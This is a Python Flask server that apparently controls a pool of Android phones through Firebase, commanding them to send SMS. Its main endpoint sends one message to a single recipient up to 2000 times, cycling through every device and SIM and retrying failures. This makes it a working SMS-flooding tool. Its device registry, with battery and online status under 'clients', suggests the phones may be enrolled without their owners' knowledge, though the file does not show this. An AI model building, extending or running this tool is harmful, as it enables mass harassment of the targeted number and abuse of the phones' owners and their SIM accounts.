#!/usr/bin/env python3
"""
Message Gateway — Flask API + shared dispatch core.

Website aur Telegram bot dono EXACTLY isi file ke helpers chalate hain,
isliye dono kabhi diverge nahi ho sakte.

  Website :  python3 app.py            ->  http://127.0.0.1:5000
  Bot     :  python3 gateway_bot.py    ->  dono ek saath bhi chal sakte hain

NOTE: the bot talks to this file over HTTP (not by importing it), so both
processes share ONE delivery tracker instead of two private copies.

v3 — SEQUENTIAL DISPATCH (device-by-device, SIM1→SIM2 round-robin):
  · Har message EK WAQT me jaata hai — koi parallel conflict nahi.
  · Order: Dev1-SIM1, Dev1-SIM2, Dev2-SIM1, Dev2-SIM2, Dev3-SIM1, ...
    Phir wapas Dev1-SIM1 se (round-robin).
  · Beech me SEND_INTERVAL (default 2.0s) ka gap — Android app SIM
    switch kar sake, Firebase update ho.
  · Device count FULLY DYNAMIC — 3 ho ya 100, sab automatically adjust.
  · Auto-queue HATA diya — sequential mode me zaroorat nahi.
  · REAL delivery accounting — har worker apna Firebase result record.
  · per-device breakdown, ek automatic retry per message.
  · jobs are persisted to delivery.json.
  · GET /api/delivery returns the live snapshot — poll it for the true count.
  · 1 SIM = 1 MESSAGE (no parts, no splitting).

Endpoints:
  GET  /api/status        -> {configured}
  POST /api/firebase      -> {url, key}
  GET  /api/devices       -> {ok, devices:[...]}
  GET  /api/delivery      -> {ok, job:{...}, jobs:[...]}
  GET  /api/delivery/failures -> {ok, count, failures:[...]}
  POST /api/message       -> {to, message, count} -> {ok, requested, capacity, job_id}
  POST /api/message-retry -> {only: deviceIdPrefix} -> {ok, retried, job_id}
"""
import json
import os
import re
import threading
import time
from collections import OrderedDict
from urllib.parse import quote, urlencode

import requests
from requests.adapters import HTTPAdapter

from flask import Flask, jsonify, request, send_from_directory

BASE = os.path.dirname(os.path.abspath(__file__))
CONFIG_FILE = os.path.join(BASE, 'firebase.json')
DELIVERY_FILE = os.path.join(BASE, 'delivery.json')
app = Flask(__name__, static_folder=BASE, static_url_path='')

# ═══════════════════════════════════════════════════════════════
#  CONFIG — env vars se tunable
# ═══════════════════════════════════════════════════════════════
SIMS_PER_DEVICE = int(os.environ.get('SIMS_PER_DEVICE', '2'))   # har device me 2 SIM
SEND_INTERVAL = float(os.environ.get('SEND_INTERVAL', '2.0'))   # messages ke beech gap (sec)
MAX_COUNT = 2000                                                # ek request me max messages
GATEWAY_PORT = int(os.environ.get('GATEWAY_PORT', '5000'))
WORKERS = int(os.environ.get('GATEWAY_WORKERS', '10'))          # kam workers — sequential me zyada zaroorat nahi
JOBS_KEPT = 8
STALE_AFTER = 900    # 15 min ke baad running job stale maana jaata hai


def log(msg=''):
    print(msg, flush=True)


def clamp_count(v, default=1):
    """Kitne messages bhejne hain — 1..MAX_COUNT."""
    try:
        n = int(float(str(v).strip()))
    except (TypeError, ValueError):
        return default
    return max(1, min(MAX_COUNT, n))


# ═══════════════════════════════════════════════════════════════
#  CONFIG LOAD/SAVE
# ═══════════════════════════════════════════════════════════════
def load_config():
    if not os.path.exists(CONFIG_FILE):
        return None
    try:
        with open(CONFIG_FILE, 'r', encoding='utf-8') as f:
            data = json.load(f)
        return data if data.get('url') and data.get('key') else None
    except Exception:
        return None


def save_config(url, key):
    data = {'url': normalize_url(url), 'key': key.strip()}
    _atomic_write(CONFIG_FILE, json.dumps(data, indent=2))


def is_configured():
    return bool(load_config())


def _atomic_write(path, text):
    tmp = path + '.tmp'
    with open(tmp, 'w', encoding='utf-8') as f:
        f.write(text)
    os.replace(tmp, path)


def normalize_url(url):
    url = str(url or '').strip()
    if not url:
        raise ValueError('Firebase URL is required')
    if not re.match(r'^https?://', url, re.I):
        url = 'https://' + url
    url = url.rstrip('/')
    if url.endswith('.json'):
        url = url[:-5].rstrip('/')
    return url


# ═══════════════════════════════════════════════════════════════
#  FIREBASE
# ═══════════════════════════════════════════════════════════════
def firebase_url(base, path=''):
    base = normalize_url(base)
    path = str(path or '').strip('/')
    encoded = '/'.join(quote(part, safe='') for part in path.split('/')) if path else ''
    return base + ('/' + encoded if encoded else '') + '.json'


def _http_session():
    session = getattr(_HTTP_LOCAL, 'session', None)
    if session is None:
        session = requests.Session()
        adapter = HTTPAdapter(pool_connections=32, pool_maxsize=64, max_retries=0)
        session.mount('http://', adapter)
        session.mount('https://', adapter)
        session.headers.update({'Connection': 'keep-alive'})
        _HTTP_LOCAL.session = session
    return session


_HTTP_LOCAL = threading.local()


def firebase_request(method, base, key, path='', body=None, timeout=6):
    target = firebase_url(base, path)
    target += ('&' if '?' in target else '?') + urlencode({'auth': key})
    session = _http_session()
    resp = session.request(method, target, json=body if body is not None else None, timeout=timeout)
    resp.raise_for_status()
    return resp.status_code


def require_config():
    cfg = load_config()
    if not cfg:
        raise RuntimeError('Firebase is not configured.')
    return cfg


def connect_firebase(url, key):
    """Credentials Firebase se validate karke save."""
    if not key or not url:
        raise ValueError('Both Database URL and secret are required')
    url = normalize_url(url)
    firebase_request('GET', url, key.strip(), 'clients')
    save_config(url, key.strip())
    return url


def fetch_clients(cfg):
    """Raw `clients` dict straight from Firebase using pooled keep-alive connection."""
    target = firebase_url(cfg['url'], 'clients') + '?' + urlencode({'auth': cfg['key']})
    resp = _http_session().get(target, timeout=8)
    resp.raise_for_status()
    return resp.json()


# ═══════════════════════════════════════════════════════════════
#  DEVICES
# ═══════════════════════════════════════════════════════════════
def device_list(raw):
    if not isinstance(raw, dict):
        return []
    result = []
    for device_id, value in raw.items():
        if not isinstance(value, dict):
            value = {'value': value}
        sims = value.get('sims') if isinstance(value.get('sims'), list) else []
        phone = value.get('phoneNumber') or (sims[0].get('phoneNumber') if sims and isinstance(sims[0], dict) else '—')
        result.append({
            'id': str(device_id),
            'name': str(value.get('name') or value.get('deviceName') or value.get('model') or device_id),
            'phoneNumber': phone or '—',
            'status': bool(value.get('status')),
            'model': value.get('model') or '—',
            'batteryPercent': value.get('batteryPercent')
        })
    return result


def get_devices(cfg=None):
    """Returns (devices, error). Never raises."""
    cfg = cfg or load_config()
    if not cfg:
        return [], 'Firebase is not configured.'
    try:
        return device_list(fetch_clients(cfg)), None
    except Exception as e:
        return [], str(e)


# ═══════════════════════════════════════════════════════════════
#  DELIVERY TRACKER
# ═══════════════════════════════════════════════════════════════
class DeliveryTracker:
    """
    Har blast ek 'job' hai. Job ke andar har device ka apna counter hai.

    submitted -> task queue me daal diya gaya
    sent     -> Firebase ne HTTP 200 diya (REAL delivery)
    failed   -> exception, retry ke baad bhi nahi hua
    """

    def __init__(self):
        self._lock = threading.RLock()
        self._jobs = OrderedDict()
        self._seq = 0
        self._dirty = 0.0
        self._load()

    def _load(self):
        if not os.path.exists(DELIVERY_FILE):
            return
        try:
            with open(DELIVERY_FILE, 'r', encoding='utf-8') as f:
                data = json.load(f)
        except Exception:
            return
        jobs = data.get('jobs') or []
        for job in jobs[-JOBS_KEPT:]:
            submitted = int(job.get('submitted', 0) or 0)
            done = int(job.get('sent', 0) or 0) + int(job.get('failed', 0) or 0)
            requested = int(job.get('requested', job.get('total', 0)) or 0)
            dispatched = int(job.get('dispatched', 0) or 0)
            queued = max(0, requested - dispatched)
            job['interrupted'] = bool((submitted > done) or queued > 0)
            self._jobs[job['id']] = job
        self._seq = data.get('seq', 0)

    def _persist(self, force=False):
        now = time.time()
        if not force and now - self._dirty < 0.5:
            return
        self._dirty = now
        try:
            _atomic_write(DELIVERY_FILE, json.dumps(
                {'seq': self._seq, 'jobs': list(self._jobs.values())[-JOBS_KEPT:]},
                ensure_ascii=False,
            ))
        except Exception:
            pass

    def start(self, to, message, devices, requested, capacity, dispatched):
        with self._lock:
            self._seq += 1
            job_id = time.strftime('%H%M%S') + '-' + format(self._seq, '02d')
            job = {
                'id': job_id,
                'to': to,
                'message': message,
                'requested': int(requested),
                'capacity': int(capacity),
                'dispatched': int(dispatched),
                'total': int(requested),
                'submitted': 0,
                'sent': 0,
                'failed': 0,
                'started': time.time(),
                'finished': 0.0,
                'interrupted': False,
                'workers': WORKERS,
                'failures': [],
                'devices': {
                    d['id']: {
                        'name': d['name'],
                        'status': d['status'],
                        'phoneNumber': d['phoneNumber'],
                        'batteryPercent': d['batteryPercent'],
                        'total': 0, 'sent': 0, 'failed': 0,
                    }
                    for d in devices
                },
            }
            self._jobs[job_id] = job
            while len(self._jobs) > JOBS_KEPT:
                self._jobs.popitem(last=False)
            self._persist(force=True)
            return job_id

    def dispatch(self, job_id, n):
        with self._lock:
            job = self._jobs.get(job_id)
            if not job:
                return
            job['dispatched'] += n
            job['finished'] = 0.0
            self._persist(force=True)

    def submit(self, job_id, device_id):
        with self._lock:
            job = self._jobs.get(job_id)
            if not job:
                return
            job['submitted'] += 1
            job['finished'] = 0.0
            dev = job['devices'].get(device_id)
            if dev:
                dev['total'] += 1
            self._persist()

    def finish(self, job_id, device_id, ok):
        with self._lock:
            job = self._jobs.get(job_id)
            if not job:
                return
            if ok:
                job['sent'] += 1
            else:
                job['failed'] += 1
            dev = job['devices'].get(device_id)
            if dev:
                dev['sent' if ok else 'failed'] += 1
            done = job['sent'] + job['failed']
            if job['submitted'] and done >= job['submitted'] and not job['finished']:
                job['finished'] = time.time()
            self._persist()

    def record_failure(self, job_id, device_id, sim):
        with self._lock:
            job = self._jobs.get(job_id)
            if not job:
                return
            fails = job.setdefault('failures', [])
            if len(fails) < 6000:
                fails.append([device_id, sim])
            self._persist()

    def failures(self, job_id=None):
        with self._lock:
            if job_id and job_id in self._jobs:
                raw = self._jobs[job_id].get('failures') or []
            elif not self._jobs:
                return []
            else:
                raw = self._jobs[list(self._jobs)[-1]].get('failures') or []
            return [tuple(f[:2]) for f in raw]

    def raw(self, job_id=None):
        with self._lock:
            if job_id and job_id in self._jobs:
                return dict(self._jobs[job_id])
            if not self._jobs:
                return None
            return dict(self._jobs[list(self._jobs)[-1]])

    def _view(self, job):
        done = job['sent'] + job['failed']
        requested = job.get('requested') or job.get('total') or 1
        capacity = job.get('capacity') or 0
        dispatched = job.get('dispatched', 0)
        elapsed = (job['finished'] or time.time()) - job['started']

        in_flight = max(0, job['submitted'] - done)
        queued = max(0, requested - dispatched)
        pending = queued + in_flight

        complete = bool(job['submitted']) and in_flight == 0 and queued == 0
        running = in_flight > 0 and (time.time() - job['started']) < STALE_AFTER

        processed = min(100.0, done * 100.0 / requested)
        devices = []
        for dev_id, dev in job['devices'].items():
            d_done = dev['sent'] + dev['failed']
            devices.append({
                'id': dev_id,
                'name': dev['name'],
                'status': dev['status'],
                'phoneNumber': dev['phoneNumber'],
                'batteryPercent': dev['batteryPercent'],
                'total': dev['total'],
                'sent': dev['sent'],
                'failed': dev['failed'],
                'done': d_done >= dev['total'] and dev['total'] > 0,
            })
        devices.sort(key=lambda d: (d['failed'] > 0, d['name'].lower()))
        return {
            'id': job['id'],
            'to': job['to'],
            'message': job['message'],
            'requested': requested,
            'capacity': capacity,
            'dispatched': dispatched,
            'queued': queued,
            'total': requested,
            'submitted': job['submitted'],
            'sent': job['sent'],
            'failed': job['failed'],
            'failed_tasks': len(job.get('failures') or []),
            'done': done,
            'remaining': pending,
            'percent': round(processed, 1),
            'sent_percent': round(min(100.0, job['sent'] * 100.0 / requested), 1),
            'success': round(job['sent'] * 100.0 / done, 1) if done else None,
            'complete': complete,
            'running': running,
            'interrupted': bool(job.get('interrupted')),
            'started': job['started'],
            'elapsed': round(elapsed, 1),
            'rate': round(done / elapsed, 1) if elapsed > 0.4 and done else 0.0,
            'active': sum(1 for d in devices if d['status']),
            'devices': devices,
        }

    def snapshot(self, job_id=None):
        with self._lock:
            if job_id and job_id in self._jobs:
                return self._view(self._jobs[job_id])
            if not self._jobs:
                return None
            last = list(self._jobs)[-1]
            return self._view(self._jobs[last])

    def job_ids(self):
        with self._lock:
            return list(self._jobs)[-JOBS_KEPT:]

    def reset(self):
        with self._lock:
            self._jobs.clear()
            self._persist(force=True)

    def active(self):
        with self._lock:
            for job_id in reversed(list(self._jobs)):
                view = self._view(self._jobs[job_id])
                if view['running']:
                    return job_id
        return None

    def wait(self, job_id=None, timeout=180, every=0.4):
        deadline = time.time() + timeout
        while time.time() < deadline:
            view = self.snapshot(job_id)
            if not view:
                return None
            if view['complete'] or view['interrupted']:
                return view
            time.sleep(every)
        return self.snapshot(job_id)


TRACKER = DeliveryTracker()


# ═══════════════════════════════════════════════════════════════
#  BROADCAST — SEQUENTIAL DISPATCH
# ═══════════════════════════════════════════════════════════════
def _send_once(cfg, device_id, sim, count, to, message):
    path = f'clients/{device_id}/webhookEvent/sendSms'
    body = {
        'from': sim,
        'to': to,
        'message': message,
        'isSended': False,
        'timestamp': int(time.time() * 1000)
    }
    return firebase_request('PUT', cfg['url'], cfg['key'], path, body)


def build_slots(devices):
    """
    Har device ke SIMS_PER_DEVICE slots.
    Order: Dev1-SIM1, Dev1-SIM2, Dev2-SIM1, Dev2-SIM2, ...
    Online devices PEHLE (zyada success rate).
    """
    slots = []
    for d in sorted(devices, key=lambda x: (not x['status'], x['name'].lower())):
        for sim in range(1, SIMS_PER_DEVICE + 1):
            slots.append({
                'device_id': d['id'],
                'sim': sim,
                'name': d['name'],
                'status': d['status'],
            })
    return slots


def send_single_task(cfg, device_id, sim, to, message, job_id=None):
    """1 SIM = 1 message. Ek automatic retry on failure."""
    label = f'Dev: {device_id[:6]}.. | SIM {sim}'
    last = None
    for attempt in (1, 2):
        try:
            status = _send_once(cfg, device_id, sim, 1, to, message)
            TRACKER.finish(job_id, device_id, True)
            log(f'[✅ INSTANT] {label} -> HTTP {status}')
            return True
        except Exception as e:
            last = e
            if attempt == 1:
                continue
    TRACKER.record_failure(job_id, device_id, sim)
    TRACKER.finish(job_id, device_id, False)
    log(f'[❌ FAILED] {label} -> {last}')
    return False


def _dispatch_sequentially(cfg, to, message, slots, count, job_id):
    """
    Sequential dispatch — EK message ek waqt.
    Order: Dev1-SIM1 → Dev1-SIM2 → Dev2-SIM1 → Dev2-SIM2 → ...
    Phir wapas Dev1-SIM1 se (round-robin).
    Beech me SEND_INTERVAL gap (default 2s).
    """
    total_slots = len(slots)
    log(f'[SEQ-START] job={job_id} count={count} slots={total_slots} '
        f'interval={SEND_INTERVAL}s')

    for i in range(count):
        slot = slots[i % total_slots]
        TRACKER.submit(job_id, slot['device_id'])
        try:
            send_single_task(cfg, slot['device_id'], slot['sim'],
                             to, message, job_id)
        except Exception as e:
            log(f'[SEQ-ERR] {slot["device_id"][:6]}..SIM{slot["sim"]}: {e}')

        # Gap between messages — last message ke baad wait nahi
        if i < count - 1:
            time.sleep(SEND_INTERVAL)

    log(f'[SEQ-DONE] job={job_id} dispatched {count} messages')


def blast(cfg, to, message, count, online_only=False, job_id=None):
    """
    Sequential blast — ek message ek waqt, device-by-device SIM1→SIM2.
    Device count FULLY DYNAMIC — jitne devices Firebase me hain, sab use honge.
    """
    count = clamp_count(count)
    devices = device_list(fetch_clients(cfg))
    if not devices:
        raise RuntimeError('No devices found in the pool')
    if online_only:
        devices = [d for d in devices if d['status']]

    slots = build_slots(devices)
    capacity = len(slots)
    if capacity == 0:
        raise RuntimeError('No SIM cards available')

    new_job = job_id is None
    if new_job:
        job_id = TRACKER.start(to, message, devices, count, capacity, count)

    # Sequential dispatch background thread me
    threading.Thread(
        target=_dispatch_sequentially,
        args=(cfg, to, message, slots, count, job_id),
        daemon=True,
    ).start()

    active = sum(1 for d in devices if d['status'])
    log(f'[BLAST] job={job_id} to={to} asked={count} sims={capacity} '
        f'devices={len(devices)} (active {active})')

    return {
        'ok': True,
        'job_id': job_id,
        'requested': count,
        'capacity': capacity,
        'dispatched': count,
        'queued': 0,
        'devices_count': len(devices),
        'active_devices': active,
        'total': count,
    }


def broadcast(cfg, to, message, count, online_only=False):
    """Public entry — sequential blast. Koi auto-queue nahi."""
    count = clamp_count(count)
    return blast(cfg, to, message, count, online_only)


# ═══════════════════════════════════════════════════════════════
#  RETRY FAILED — sirf fail hue messages dobara
# ═══════════════════════════════════════════════════════════════
def broadcast_failed(cfg, job_id=None, only=None):
    """
    Sirf FAIL hue messages dobara bhejo — baaki dobara mat bhejo.
    Returns {ok, retried, devices_count, job_id}.
    """
    fails = TRACKER.failures(job_id)
    if not fails:
        raise RuntimeError('Nothing to retry — is blast me koi failure nahi.')

    if only:
        wanted = {t.strip() for t in re.split(r'[,\s]+', str(only)) if t.strip()}
        fails = [f for f in fails if any(f[0].startswith(t) for t in wanted)]
        if not fails:
            raise RuntimeError('Us device ka koi failed message nahi.')

    src = TRACKER.raw(job_id) or {}
    to, message = src.get('to') or '', src.get('message') or ''
    if not to or not message:
        raise RuntimeError('Original blast ka recipient/message nahi mila.')

    by_id = {d['id']: d for d in device_list(fetch_clients(cfg))}
    todo = [f for f in fails if f[0] in by_id]
    if not todo:
        raise RuntimeError('Ye devices ab pool me nahi hain.')

    involved, seen = [], set()
    for dev_id, _sim in todo:
        if dev_id not in seen:
            seen.add(dev_id)
            involved.append(by_id[dev_id])

    new_job = TRACKER.start(to, message, involved, len(todo), len(todo), len(todo))

    # Retry bhi sequential — ek waqt me ek
    def _retry_worker():
        for dev_id, sim in todo:
            TRACKER.submit(new_job, dev_id)
            try:
                send_single_task(cfg, dev_id, sim, to, message, new_job)
            except Exception as e:
                log(f'[RETRY-ERR] {dev_id[:6]}..SIM{sim}: {e}')
            time.sleep(SEND_INTERVAL)

    threading.Thread(target=_retry_worker, daemon=True).start()

    log(f'[RETRY] job={new_job} retried={len(todo)} devices={len(involved)}')
    return {'ok': True, 'retried': len(todo),
            'devices_count': len(involved), 'job_id': new_job}


# ═══════════════════════════════════════════════════════════════
#  FLASK ROUTES
# ═══════════════════════════════════════════════════════════════
@app.get('/')
def index():
    return send_from_directory(BASE, 'index.html')


@app.get('/api/status')
def api_status():
    return jsonify({
        'configured': is_configured(),
        'workers': WORKERS,
        'mode': 'sequential',
        'send_interval': SEND_INTERVAL,
        'sims_per_device': SIMS_PER_DEVICE,
    })


@app.post('/api/firebase')
def api_firebase():
    data = request.get_json(silent=True) or {}
    try:
        connect_firebase(data.get('url', ''), data.get('key', ''))
        return jsonify({'ok': True})
    except ValueError as e:
        return jsonify({'ok': False, 'error': str(e)}), 400
    except Exception as e:
        return jsonify({'ok': False, 'error': str(e)}), 502


@app.get('/api/devices')
def api_devices():
    devices, err = get_devices()
    if err:
        return jsonify({'ok': False, 'error': err}), 400
    return jsonify({'ok': True, 'devices': devices})


@app.get('/api/delivery')
def api_delivery():
    """REAL live progress. ?job=<id> se kisi purane blast ko dekho."""
    job = TRACKER.snapshot(request.args.get('job'))
    return jsonify({
        'ok': True,
        'job': job,
        'jobs': TRACKER.job_ids(),
        'active': TRACKER.active(),
        'mode': 'sequential',
    })


@app.get('/api/delivery/failures')
def api_delivery_failures():
    """Exactly kaun se (device, SIM) fail hue."""
    job_id = request.args.get('job')
    fails = TRACKER.failures(job_id)
    limit = min(len(fails), 500)
    return jsonify({
        'ok': True,
        'count': len(fails),
        'devices': sorted({f[0] for f in fails}),
        'failures': [{'device': f[0], 'sim': f[1]} for f in fails[:limit]],
        'truncated': len(fails) > limit,
    })


@app.post('/api/message-retry')
def api_message_retry():
    """Sirf FAIL hue messages dobara bhejo. {only: deviceIdPrefix}"""
    data = request.get_json(silent=True) or {}
    cfg = load_config()
    if not cfg:
        return jsonify({'ok': False, 'error': 'Firebase is not configured.'}), 400
    try:
        return jsonify(broadcast_failed(cfg, None, data.get('only')))
    except RuntimeError as e:
        return jsonify({'ok': False, 'error': str(e)}), 400
    except Exception as e:
        return jsonify({'ok': False, 'error': str(e)}), 400


@app.post('/api/message')
def api_message():
    data = request.get_json(silent=True) or {}
    to, message = str(data.get('to', '')).strip(), str(data.get('message', ''))

    if not to or not message.strip():
        return jsonify({'ok': False, 'error': 'Recipient and message required'}), 400

    cfg = load_config()
    if not cfg:
        return jsonify({'ok': False, 'error': 'Firebase is not configured.'}), 400

    try:
        return jsonify(broadcast(
            cfg, to, message,
            clamp_count(data.get('count', data.get('copies', 1))),
            online_only=bool(data.get('onlineOnly'))
        ))
    except RuntimeError as e:
        return jsonify({'ok': False, 'error': str(e)}), 404
    except Exception as e:
        return jsonify({'ok': False, 'error': str(e)}), 400


# ═══════════════════════════════════════════════════════════════
#  MAIN
# ═══════════════════════════════════════════════════════════════
if __name__ == '__main__':
    log(f'⚡ Sequential Gateway Engine — http://127.0.0.1:{GATEWAY_PORT}')
    log(f'   1 SIM = 1 message · {SIMS_PER_DEVICE} SIM/device · '
        f'interval {SEND_INTERVAL}s · workers {WORKERS}')
    log(f'   Mode: SEQUENTIAL (Dev1-SIM1 → Dev1-SIM2 → Dev2-SIM1 → ...)')
    log(f'   Bind: 0.0.0.0:{GATEWAY_PORT}')
    app.run(host='0.0.0.0', port=GATEWAY_PORT, debug=False, threaded=True)
